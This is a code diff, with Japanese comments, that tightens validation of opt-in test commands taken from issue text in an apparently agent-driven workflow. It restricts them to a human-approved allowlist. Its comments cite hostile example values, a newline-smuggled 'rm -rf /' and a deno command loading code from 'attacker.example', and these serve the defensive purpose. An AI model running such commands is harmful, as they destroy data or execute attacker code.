@@ -657,11 +657,82 @@ function hasParentPathTraversal(s) {
   return /(^|[^.])\.\.([^.]|$)/.test(s)
 }
 
-// args.externalChecks のパーサ（parseExternalChecks）と同じ形の決定的パーサ。イシュー本文
-// 由来の宣言値（Tree フェーズが抽出した生値）を受け取り、許可形式に合致するもののみ
-// commands へ、それ以外は invalid へ振り分ける（fail-closed。ホストが検証済みコマンドのみを
-// 実行エージェントへ渡すための境界）。
-function parseOptinTestDeclarations(raw) {
+// 宣言コマンド 1 件分の許可形式検証（文字集合・垂直空白拒否・パストラバーサル・"//"・許可
+// ランナー・サブコマンド制約・mvn GAV・deno リモート指定子）を単一の判定関数へ集約する。
+// PR #503 codex P0（下記 parseOptinTestDeclarations のコメント参照）で「args.optinTestCommands
+// （人間が起動時に明示する承認一覧）が唯一の実行許可根拠」という設計になったため、承認一覧側
+// （parseOptinTestCommands）の検証がここより緩いと承認一覧を経由しない迂回が生まれる。
+// 承認一覧側・宣言側（宣言側は現状メンバーシップ判定のみで直接は呼ばないが、将来 approved 自体
+// の再検証が要る場合に同じ基準を再利用できるよう独立関数にしてある）の双方が同一基準を持つ
+// ことを、この関数を単一の真実源にすることで保証する。返り値は形式不正なら { ok: false }、
+// 妥当なら { ok: true, value: <正規化済み文字列> }。
+function validateOptinCommandForm(v) {
+  if (typeof v !== 'string') return { ok: false }
+  // 改行・タブ等の垂直空白を水平空白へ折り畳まない（折り畳むと「rm -rf /」等の別コマンドを
+  // 改行区切りで密輸でき、複数行を 1 コマンドへ結合してしまう）。垂直空白を含む値はここで
+  // 直ちに拒否し、水平空白（スペース・タブ）の連続のみを 1 個の半角スペースへ畳む。
+  if (/[\r\n\v\f]/.test(v)) return { ok: false }
+  const s = v.trim().replace(/[ \t]+/g, ' ')
+  // '//' 拒否は URL 形式の引数（例: `deno test -A https://attacker.example/x.ts`）の混入を防ぐ。
+  // deno は第 2 トークンを 'test'/'task' に制限しているだけでリモートモジュール URL の実行自体は
+  // 拒否していないため、値そのものに URL を書けないようにする境界をここへ追加する（A03）。
+  if (!OPTIN_TEST_COMMAND_RE.test(s) || hasParentPathTraversal(s) || s.includes('//')) return { ok: false }
+  const tokens = s.split(' ')
+  const runner = tokens[0]
+  if (!OPTIN_TEST_RUNNERS.has(runner)) return { ok: false }
+  const subcommands = OPTIN_TEST_RUNNER_SUBCOMMANDS[runner]
+  if (subcommands && !subcommands.has(tokens[1])) return { ok: false }
+  if (hasMavenGavGoal(runner, tokens) || hasDenoRemoteSpecifier(runner, tokens)) return { ok: false }
+  return { ok: true, value: s }
+}
+
+const OPTIN_TEST_COMMANDS_MAX = 20
+// args.optinTestCommands の決定的パーサ（parseExternalChecks と同じ起動時契約: undefined/null
+// → []、形式不正は throw して即座に起動を止める）。
+//
+// 背景（PR #503 codex P0）: parseOptinTestDeclarations は従来イシュー本文（非信頼データ）の
+// 宣言を形式検証だけで通していたが、OPTIN_TEST_RUNNERS 自体が make / npm run / yarn run /
+// deno task のような**任意タスクのディスパッチャー**であり、`make deploy`・`npm run release`
+// のような値も形式上は正当なコマンドとして通ってしまう。形式検証だけでは「本文が任意タスクの
+// 起動を持ち込む」ことを構造的に閉じられない。そのため実行許可の根拠を「形式が正しいか」から
+// 「人間がラン起動時に明示した信頼済み値と完全一致するか」へ移す。ここで検証・確定した一覧が
+// parseOptinTestDeclarations の唯一の照合対象になり、一覧に無いコマンドは本文にどう書かれて
+// いても実装エージェントへ渡らない。
+function parseOptinTestCommands(raw) {
+  if (raw === undefined || raw === null) return []
+  if (!Array.isArray(raw)) {
+    throw new Error('args.optinTestCommands は文字列配列で指定すること（例: {"optinTestCommands": ["make e2e-three-client"]}）')
+  }
+  if (raw.length > OPTIN_TEST_COMMANDS_MAX) {
+    throw new Error(`args.optinTestCommands の要素数が多すぎる（最大 ${OPTIN_TEST_COMMANDS_MAX} 件）: ${raw.length}`)
+  }
+  const commands = []
+  raw.forEach((v, i) => {
+    const r = validateOptinCommandForm(v)
+    if (!r.ok) {
+      throw new Error(
+        `args.optinTestCommands[${i}] が opt-in テストコマンドの許可形式ではない`
+        + '（文字集合・パストラバーサル・許可ランナー・サブコマンド制約・mvn GAV・deno リモート指定子。'
+        + `SKILL.md「opt-in テストの宣言」節参照）: ${String(v).slice(0, 80)}`,
+      )
+    }
+    if (!commands.includes(r.value)) commands.push(r.value)
+  })
+  return commands
+}
+const optinTestCommandsInput = parseOptinTestCommands(
+  parsedArgs && typeof parsedArgs === 'object' ? parsedArgs.optinTestCommands : undefined,
+)
+
+// イシュー本文由来の宣言値（Tree フェーズが抽出した生値）を受け取り、正規化後に approved
+// （args.optinTestCommands の検証済み一覧。呼び出し元は駆動部 Tree フェーズで
+// optinTestCommandsInput を渡す）のいずれかと**文字列完全一致**したものだけを commands へ
+// 採用する。一致しない宣言・approved が未指定/空の状態での宣言はすべて invalid（fail-closed。
+// PR #503 codex P0: 本文だけでは新しいコマンドを持ち込めない設計。上記 parseOptinTestCommands
+// のコメント参照）。approved 側で既に validateOptinCommandForm を通過済みのため、ここでの
+// 判定は正規化 + 完全一致のみで足りる（形式検証の再実施は不要）。
+function parseOptinTestDeclarations(raw, approved) {
+  const approvedList = Array.isArray(approved) ? approved : []
   if (raw === undefined || raw === null) return { commands: [], invalid: [] }
   if (!Array.isArray(raw)) return { commands: [], invalid: [capText(sanitize(JSON.stringify(raw)), 300)] }
   const commands = []
@@ -671,34 +742,16 @@ function parseOptinTestDeclarations(raw) {
       invalid.push(capText(sanitize(JSON.stringify(v)), 300))
       continue
     }
-    // 改行・タブ等の垂直空白を水平空白へ折り畳まない（折り畳むと「rm -rf /」等の別コマンドを
-    // 改行区切りで密輸でき、複数行を 1 コマンドへ結合してしまう）。垂直空白を含む値はここで
-    // 直ちに拒否し、水平空白（スペース・タブ）の連続のみを 1 個の半角スペースへ畳む。
+    // 垂直空白の拒否理由は validateOptinCommandForm と同じ（改行密輸の防止）。approved は
+    // 既に垂直空白を含まない正規化済み値のみで構成されるため、ここで拒否しても後続の
+    // 完全一致判定は素通りしない（見つからず invalid になるだけ）が、意図を明示するため残す。
     if (/[\r\n\v\f]/.test(v)) {
       invalid.push(capText(sanitize(v), 300))
       continue
     }
     const s = v.trim().replace(/[ \t]+/g, ' ')
-    // '//' 拒否は URL 形式の引数（例: `deno test -A https://attacker.example/x.ts`）の混入を防ぐ。
-    // deno は第 2 トークンを 'test'/'task' に制限しているだけでリモートモジュール URL の実行自体は
-    // 拒否していないため、値そのものに URL を書けないようにする境界をここへ追加する（A03）。
-    if (!OPTIN_TEST_COMMAND_RE.test(s) || hasParentPathTraversal(s) || s.includes('//')) {
+    if (!approvedList.includes(s)) {
       invalid.push(capText(sanitize(v), 300))
-      continue
-    }
-    const tokens = s.split(' ')
-    const runner = tokens[0]
-    if (!OPTIN_TEST_RUNNERS.has(runner)) {
-      invalid.push(capText(sanitize(s), 300))
-      continue
-    }
-    const subcommands = OPTIN_TEST_RUNNER_SUBCOMMANDS[runner]
-    if (subcommands && !subcommands.has(tokens[1])) {
-      invalid.push(capText(sanitize(s), 300))
-      continue
-    }
-    if (hasMavenGavGoal(runner, tokens) || hasDenoRemoteSpecifier(runner, tokens)) {
-      invalid.push(capText(sanitize(s), 300))
       continue
     }
     if (!commands.includes(s)) commands.push(s)
@@ -4517,10 +4570,12 @@ for (const n of tree.nodes) {
   // dependsOn はイシュー番号（正の整数）のみ許可。プロンプト指示は信頼境界ではないため
   // 返却値が契約を満たすかをここで構造的に検証する。
   for (const d of n.dependsOn ?? []) assertInt(d, `tree.nodes[].dependsOn[]（issue #${n.number}）`)
-  // opt-in テスト記録ゲート（Issue #495）。Tree エージェントの生値（イシュー本文由来）を許可
-  // 形式へ再検証し、n.optinTests を検証済みコマンド配列へ置き換える（invalid は runImplement
-  // 冒頭が blocked 終端の判定に使う）。queue item は { ...node } で作られるためそのまま伝播する。
-  const optinParsed = parseOptinTestDeclarations(n.optinTests)
+  // opt-in テスト記録ゲート（Issue #495 / PR #503 codex P0）。Tree エージェントの生値
+  // （イシュー本文由来）を、起動時に確定済みの承認一覧 optinTestCommandsInput（args.
+  // optinTestCommands）と完全一致するものだけへ絞り込み、n.optinTests を採用コマンド配列へ
+  // 置き換える（invalid は runImplement 冒頭が blocked 終端の判定に使う）。queue item は
+  // { ...node } で作られるためそのまま伝播する。
+  const optinParsed = parseOptinTestDeclarations(n.optinTests, optinTestCommandsInput)
   n.optinTests = optinParsed.commands
   n.optinTestsInvalid = optinParsed.invalid
   if (n.optinTests.length > 0) {
@@ -4532,7 +4587,7 @@ for (const n of tree.nodes) {
     }
   }
   if (n.optinTestsInvalid.length > 0) {
-    log(`⚠️ #${n.number}: opt-in テスト宣言が許可形式外（${n.optinTestsInvalid.map(sanitize).join(' / ')}）。実装は起動せず blocked で停止する`)
+    log(`⚠️ #${n.number}: opt-in テスト宣言が承認一覧（args.optinTestCommands）に無いか許可形式外（${n.optinTestsInvalid.map(sanitize).join(' / ')}）。実装は起動せず blocked で停止する`)
   }
 }
 
@@ -5070,9 +5125,12 @@ async function runImplement(item) {
   // Recover → Plan の重複実装経路へ誤って落ちる）。
   if (Array.isArray(item.optinTestsInvalid) && item.optinTestsInvalid.length > 0) {
     const reason = capText(
-      `イシュー本文の opt-in テスト宣言が許可形式外（${item.optinTestsInvalid.join(' / ')}）。` +
-      `許可形式: 先頭トークンが ${[...OPTIN_TEST_RUNNERS].join(' / ')} のいずれか・シェルメタ文字不可・最大 ${OPTIN_TESTS_MAX} 件。` +
-      `イシューの \`<!-- optin-tests: ... -->\` マーカーを修正して再実行すること`,
+      `イシュー本文の opt-in テスト宣言が承認一覧（args.optinTestCommands）に無いか許可形式外（${item.optinTestsInvalid.join(' / ')}）。` +
+      `PR #503 codex P0 対応により、opt-in テストはイシュー本文だけで持ち込めず、` +
+      `ラン起動時の args.optinTestCommands（人間承認済みのコマンド一覧。最大 ${OPTIN_TEST_COMMANDS_MAX} 件）に` +
+      `正規化後の文字列が完全一致で含まれている必要がある。イシューの \`<!-- optin-tests: ... -->\` マーカーを` +
+      `args.optinTestCommands のいずれかと一致する値へ修正するか、args.optinTestCommands へ当該コマンドを` +
+      `追加して同じ args で再実行すること`,
     )
     await updateState(item.number, { status: 'blocked', note: reason })
     recordFailure({
